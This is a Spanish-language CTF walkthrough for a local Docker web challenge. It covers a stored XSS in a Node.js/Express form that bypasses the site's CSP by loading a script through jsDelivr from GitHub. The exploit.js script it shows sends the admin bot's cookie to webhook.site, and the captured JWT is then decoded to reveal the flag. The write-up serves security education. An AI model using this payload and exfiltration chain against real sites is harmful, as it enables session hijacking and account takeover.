---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Challenge Webhooks Easy

URL Download challenge = EN PROCESO...

## Contexto del challenge

### Trayectoria del Challenge

<figure><img src="../../.gitbook/assets/trayectoria_challenge_webhooks.png" alt=""><figcaption></figcaption></figure>

### Descripción general

El challenge **Webhooks** es un challenge de **seguridad web** desplegado mediante **Docker**, cuyo objetivo principal es la explotación de una aplicación web desarrollada en **Node.js con Express**. La aplicación simula un formulario de registro para un evento temático de Halloween y cuenta con un panel de administración interno visitado automáticamente por un **bot administrador**.

El reto está diseñado para evaluar conocimientos en:

* **Análisis de código fuente**
* **Cross-Site Scripting (XSS) almacenado**
* **Políticas de seguridad web (Content Security Policy – CSP)**
* **Exfiltración de cookies y tokens JWT**
* **Abuso de bots automatizados (Admin Bot)**
* **Manipulación y decodificación de JWT**

El objetivo final del challenge es **obtener la flag**, la cual se encuentra protegida dentro de una **cookie de sesión JWT** perteneciente al usuario administrador y únicamente accesible mediante la explotación encadenada de varias debilidades de seguridad.

### Arquitectura y funcionamiento de la máquina

La máquina se ejecuta localmente mediante Docker y expone un único servicio web:

* **Aplicación web:** Node.js + Express
* **Puerto:** 1337
* **Interfaz:** Formulario de registro web
* **Panel interno:** `/admin` (no accesible directamente por el usuario)

Cuando un usuario envía un formulario, la información es almacenada y posteriormente visualizada en un panel de administración. Dicho panel es visitado de forma automática por un **bot basado en Puppeteer**, el cual:

* Inicia sesión como **admin**
* Carga una cookie de sesión JWT válida
* Accede al panel `/admin`
* Procesa las solicitudes pendientes

Esta arquitectura introduce un escenario realista de **Stored XSS + Admin Bot**, muy común en entornos reales y competiciones CTF.

### Vulnerabilidades identificadas

A continuación se enumeran las vulnerabilidades presentes en la máquina, incluyendo su **identificación**, **CVE/CWE asociado** y **criticidad según CVSS v3.1**.

<figure><img src="../../.gitbook/assets/vuln1.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln2.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln3.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln4.png" alt=""><figcaption></figcaption></figure>

## Instalación

Primero tendremos que descomprimir el archivo `challenge_webhook.zip` y, posteriormente, descomprimir el archivo `challenge.zip`, que es del cual vamos a obtener la información de cómo está compuesto internamente el reto.

```shell
unzip challenge_webhook.zip
cd challenge_webhook/
unzip challenge.zip
```

Una vez realizado este paso, vamos a iniciar el servidor de la página vulnerable utilizando la herramienta incluida llamada `run.sh`.

```shell
./run.sh
```

Resultado:

```
======================================
[*] Desplegando Docker...
======================================
[+] Building 1.1s (11/11) FINISHED                                                                                                                                       docker:default
 => [internal] load build definition from Dockerfile                                                                                                                               0.0s
 => => transferring dockerfile: 672B                                                                                                                                               0.0s
 => [internal] load metadata for docker.io/library/node:18-slim                                                                                                                    1.0s
 => [internal] load .dockerignore                                                                                                                                                  0.0s
 => => transferring context: 2B                                                                                                                                                    0.0s
 => [1/6] FROM docker.io/library/node:18-slim@sha256:f9ab18e354e6855ae56ef2b290dd225c1e51a564f87584b9bd21dd651838830e                                                              0.0s
 => [internal] load build context                                                                                                                                                  0.0s
 => => transferring context: 6.68kB                                                                                                                                                0.0s
 => CACHED [2/6] RUN apt-get update && apt-get install -y     chromium     fonts-liberation     libnss3     libatk1.0-0     libatk-bridge2.0-0     libcups2     libdrm2     libxk  0.0s
 => CACHED [3/6] WORKDIR /app                                                                                                                                                      0.0s
 => CACHED [4/6] COPY package*.json ./                                                                                                                                             0.0s
 => CACHED [5/6] RUN npm install                                                                                                                                                   0.0s
 => [6/6] COPY . .                                                                                                                                                                 0.0s
 => exporting to image                                                                                                                                                             0.0s
 => => exporting layers                                                                                                                                                            0.0s
 => => writing image sha256:306d4847edb837392313f9511237cb33ab47db3ac7d6e03d4f35134946878e62                                                                                       0.0s
 => => naming to docker.io/library/challenge                                                                                                                                       0.0s

[+] Docker montado con exito!

======================================
[*] Iniciando docker vulnerable (Challenge)...
======================================

> cursed-secret-party@1.0.0 start
> node app.js

[+] Cursed Secret Party running on http://127.0.0.1:1337
```

Con esto veremos que ya podremos acceder a la aplicación web vulnerable desde `http://127.0.0.1:1337`. A partir de aquí, el entorno estará listo para comenzar el reto.

***

> Info extra.

Cuando terminemos el reto y queramos detener el servidor, tendremos que pulsar `Ctrl+C` varias veces en la pestaña de la terminal donde esté ejecutándose el script `run.sh`.\
Una vez detenido, deberemos ejecutar el archivo `delete.sh` para que elimine los contenedores creados.

***

## Web

Si accedemos a la siguiente `URL`:

```
URL = http://127.0.0.1:1337/
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20260111162222.png" alt=""><figcaption></figcaption></figure>

Se trata de una página web aparentemente normal, que contiene un formulario para participar en una fiesta de `Halloween` o algo similar.

Para obtener más información sobre la tecnología utilizada en la página, ejecutamos la herramienta `whatweb`.

```shell
whatweb http://127.0.0.1:1337/
```

Resultado:

```
http://127.0.0.1:1337/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[127.0.0.1], Title[Halloween Party], UncommonHeaders[content-security-policy], X-Powered-By[Express]
```

Como resultado observamos varios detalles interesantes:

* La aplicación está desarrollada sobre `Express`.
* Existen políticas de seguridad configuradas a nivel de `headers`.

> `Express`

`Express` se refiere a `Express.js`, un framework web rápido y minimalista para `Node.js`, diseñado para simplificar la creación de aplicaciones y `APIs web`, gestionando rutas y solicitudes de manera eficiente.

> Políticas de `headers`

Si inspeccionamos la página desde el navegador, accedemos a la pestaña `Network`, seleccionamos la petición `GET` a la raíz (`/`) y revisamos los `headers` de la respuesta, veremos lo siguiente:

```
Content-Security-Policy
	script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'
```

`Content-Security-Policy (CSP)` es una capa de seguridad web que ayuda a prevenir ataques como `XSS (Cross-Site Scripting)` y ataques de inyección, permitiendo definir qué fuentes de contenido (scripts, imágenes, estilos, etc.) están permitidas.

Dentro de este `header`, nos llama especialmente la atención la siguiente directiva:

```
script-src 'self' https://cdn.jsdelivr.net
```

Esto indica que la aplicación confía en scripts cargados desde su propio dominio y desde `https://cdn.jsdelivr.net`.

Si accedemos a la documentación de dicha plataforma:

URL = [Pagina jsdeliver (Seccion GitHub)](https://www.jsdelivr.com/?docs=gh)

Veremos que existe una sección dedicada a `GitHub`:

<figure><img src="../../.gitbook/assets/Pasted image 20260111162803.png" alt=""><figcaption></figcaption></figure>

En ella se explica que es posible cargar archivos directamente desde un repositorio de `GitHub`, indicando el usuario, el repositorio y el archivo a cargar.

Esto resulta muy interesante, ya que podemos aprovechar esta confianza para cargar un script externo en forma de `XSS`, siempre que encontremos un punto de inyección válido dentro de la aplicación.

La estructura de la URL sería la siguiente:

```
https://cdn.jsdelivr.net/gh/user/repo@version/file
```

Aún así, todavía necesitamos identificar el punto exacto de inyección para poder explotar este comportamiento.

## Fuzzing de archivos

<figure><img src="../../.gitbook/assets/vulnCard1.png" alt=""><figcaption></figcaption></figure>

Si revisamos el contenido del directorio `challenge` descomprimido y analizamos el código fuente de la aplicación, encontraremos varias líneas interesantes.

En el archivo `templates/admin.html` observamos el siguiente contenido:

```html
<html>
<head>
  <link rel="stylesheet" href="/static/css/bootstrap.min.css" />
  <title>Admin panel</title>
</head>

<body>
  <div class="container" style="margin-top: 20px">
    {% for request in requests %}
      <div class="card">
        <div class="card-header">
          <strong>Halloween Name</strong> : {{ request.halloween_name | safe }}
        </div>
        <div class="card-body">
          <p><strong>Email Address</strong>: {{ request.email }}</p>
          <p><strong>Costume Type</strong>: {{ request.costume_type }}</p>
          <p><strong>Prefers tricks or treat</strong>: {{ request.trick_or_treat }}</p>

          <button class="btn btn-primary">Accept</button>
          <button class="btn btn-danger">Delete</button>
        </div>
      </div>
    {% endfor %}
  </div>
</body>
</html>
```

Línea especialmente interesante:

```html
<div class="card-header">
    <strong>Halloween Name</strong> : {{ request.halloween_name | safe }}
</div>
```

Aquí podemos observar que el único parámetro de texto que **no escapa caracteres especiales** es `Halloween Name`.\
El filtro `| safe` indica que el contenido recibido del usuario es considerado seguro y se renderiza sin ningún tipo de sanitización.

El resto de campos no utilizan este filtro, por lo que sus caracteres especiales sí serán escapados automáticamente.

***

> **Info sobre `safe`**

Cuando introducimos un payload como el siguiente en un campo que **no** utiliza `| safe`:

```html
<script>alert('XSS')</script>
```

El motor de plantillas lo escapará y lo mostrará así:

```html
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

Esto evita la ejecución del código.

Sin embargo, si el campo utiliza `| safe`, el contenido no se escapará y el payload se ejecutará directamente como código JavaScript, permitiendo un ataque `XSS`.

***

<figure><img src="../../.gitbook/assets/vulnCard4.png" alt=""><figcaption></figcaption></figure>

Llegados a este punto, ya podemos planear la explotación. Para saber exactamente qué debemos obtener mediante el `XSS`, investigamos el archivo `bot/bot.js`:

```js
const fs = require('fs');
const puppeteer = require('puppeteer');
const JWTHelper = require('./helpers/JWTHelper');

const flag = fs.readFileSync('/app/flag.txt', 'utf8');

const visit = async () => {
  try {
    const browser = await puppeteer.launch({
      headless: true,
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH,
      args: ['--no-sandbox']
    });

    const page = await browser.newPage();

    const token = JWTHelper.sign({
      username: 'admin',
      user_role: 'admin',
      flag: flag
    });

    await page.setCookie({
      name: 'session',
      value: token,
      domain: '127.0.0.1'
    });

    await page.goto('http://127.0.0.1:1337/admin', {
      waitUntil: 'networkidle2'
    });

    await page.goto('http://127.0.0.1:1337/admin/delete_all', {
      waitUntil: 'networkidle2'
    });

    await browser.close();
  } catch (e) {
    console.log(e);
  }
};

module.exports = { visit };
```

Aquí vemos que existe un `bot` que visita la página `admin.html`, justo donde se encuentra el punto vulnerable a `XSS`.\
Este bot establece previamente una `Cookie` de sesión que contiene, entre otros datos, la `flag` leída directamente del servidor.

Por lo tanto, el objetivo de la explotación será:

* Inyectar código JavaScript en el campo `Halloween Name`.
* Hacer que el `bot` ejecute ese código.
* Robar la `Cookie` de sesión del `admin`.
* Decodificar el token y extraer la `flag`.

## Explotación

<figure><img src="../../.gitbook/assets/vulnCard2.png" alt=""><figcaption></figcaption></figure>

El `payload` que vamos a utilizar para el campo vulnerable es el siguiente:

```js
<script src="https://cdn.jsdelivr.net/gh/<USER>/<REPO_NAME>/exploit.js"></script>
```

> Ejemplo:

```js
<script src="https://cdn.jsdelivr.net/gh/h4ck3rSe0/test_XSS/exploit.js"></script>
```

Con esto estamos cargando un `script` externo desde una URL que está permitida por la política `CSP`, utilizando la funcionalidad de `jsDelivr` para repositorios de `GitHub`.

En mi caso, utilizaré una cuenta de pruebas de `GitHub` donde crearé un repositorio llamado `test_XSS` y dentro de él un archivo `exploit.js`.\
Este archivo se encargará de exfiltrar la `Cookie` del bot cuando sea ejecutado.

Para ello:

1. Creamos una cuenta en `GitHub`.
2. Creamos un nuevo repositorio llamado `test_XSS`.
3. Seleccionamos la opción **creating a new file**.
4. Creamos el archivo `exploit.js` con el siguiente contenido:

<figure><img src="../../.gitbook/assets/Pasted image 20260111165811.png" alt=""><figcaption></figcaption></figure>

> exploit.js

```js
fetch("https://webhook.site/<ID_WEBHOOK>/?jwt_data=" + btoa(document.cookie));
```

En lugar de abrir un puerto en nuestra máquina y configurar `port forwarding`, utilizamos el servicio `webhook.site`, que nos proporciona una URL pública temporal capaz de recibir peticiones HTTP.

URL = [Pagina Webhook](https://webhook.site/)

Este servicio nos permitirá recibir la `Cookie` como parámetro (`jwt_data`), codificada en `Base64` para evitar problemas de formato.

> El valor `<ID_WEBHOOK>` deberá ser reemplazado por el identificador generado por la página de `Webhook`.

Para mas información sobre `webhooks` leer mi articulo del mismo:

{% content-ref url="../../herramientas-tecnicas/hackingweb/webhooks-para-recepcion-de-datos-sin-exponer-tu-red.md" %}
[webhooks-para-recepcion-de-datos-sin-exponer-tu-red.md](../../herramientas-tecnicas/hackingweb/webhooks-para-recepcion-de-datos-sin-exponer-tu-red.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/vulnCard3.png" alt=""><figcaption></figcaption></figure>

Una vez guardado el archivo, volvemos a la página del puerto `1337` y, en el campo **HALLOWEEN NAME**, introducimos el payload:

```js
<script src="https://cdn.jsdelivr.net/gh/<USER>/<REPO_NAME>/exploit.js"></script>
```

Al enviar el formulario, el `bot` visitará la página de administración y ejecutará el script.\
En la página de `webhook` deberíamos ver una petición entrante similar a esta:

<figure><img src="../../.gitbook/assets/Pasted image 20260111170009.png" alt=""><figcaption></figcaption></figure>

Observamos que el parámetro contiene información codificada en `Base64`.\
La decodificamos de la siguiente manera:

```shell
echo 'c2Vzc2lvbj1leUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKMWMyVnlibUZ0WlNJNkltRmtiV2x1SWl3aWRYTmxjbDl5YjJ4bElqb2lZV1J0YVc0aUxDSm1iR0ZuSWpvaVEyaGhiR3hsYm1kbGUyUXhjMlV3WDNNMFkzSXpkRjk0YzNOZk5HUnRNVzVmWWpCMGZWeHVJaXdpYVdGMElqb3hOelk0TVRRM01UUTFMQ0psZUhBaU9qRTNOamd4TkRjME5EVjkuTGhsWWNBLVdqWll0RjJKanRNdzgtaVF6V2xvaEt2c3BZeEcwRFhuTWdBUQ==' | base64 -d; echo
```

Resultado:

```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiQ2hhbGxlbmdle2Qxc2UwX3M0Y3IzdF94c3NfNGRtMW5fYjB0fVxuIiwiaWF0IjoxNzY4MTQ3MTQ1LCJleHAiOjE3NjgxNDc0NDV9.LhlYcA-WjZYtF2JjtMw8-iQzWlohKvspYxG0DXnMgAQ
```

Esto confirma que hemos obtenido correctamente la sesión del `bot`.

Ahora procedemos a decodificar el token utilizando la herramienta `jwt.io`.

URL = [Pagina jwt.io (Decodificar Tokens JWTs)](https://www.jwt.io/)

Al pegar el contenido del token (después del `=`) en la página, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20260111170221.png" alt=""><figcaption></figcaption></figure>

La información decodificada es:

```json
{
  "username": "admin",
  "user_role": "admin",
  "flag": "Challenge{d1se0_s4cr3t_xss_4dm1n_b0t}\n",
  "iat": 1768147145,
  "exp": 1768147445
}
```

Con esto ya hemos conseguido la `flag`, que era el objetivo final del reto.

> flag.txt

```
Challenge{d1se0_s4cr3t_xss_4dm1n_b0t}
```
